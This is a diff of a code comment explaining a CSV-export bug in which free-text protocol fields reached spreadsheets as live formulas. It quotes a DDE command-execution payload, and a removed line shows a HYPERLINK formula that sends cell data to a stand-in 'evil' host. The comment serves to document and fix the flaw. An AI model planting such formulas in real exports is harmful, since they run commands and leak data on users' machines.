@@ -109,7 +109,7 @@ def _cell(value: object) -> str:
     "a comma, a quote or a newline" and `tests/test_protocol_export.py`'s as "a comma, a quote, a
     newline, an absent number, and a column order" — the one case that *executes* was in neither
     list. Driven at the time, a `solvent` of `@SUM(1+9)*cmd|'/C calc'!A0` and a `note` of
-    `=HYPERLINK("http://evil/?"&A1,"x")` both reached a spreadsheet as live formulas, and
+    an `=HYPERLINK(...)` naming an attacker's host both reached a spreadsheet as live formulas, and
     `QUOTE_MINIMAL` does nothing about it because quoting is stripped before the parse. Those
     fields are free text on a design drafted from tool results and then edited over
     `POST /protocols/{id}/revisions`, which is exactly the text this repository treats as untrusted
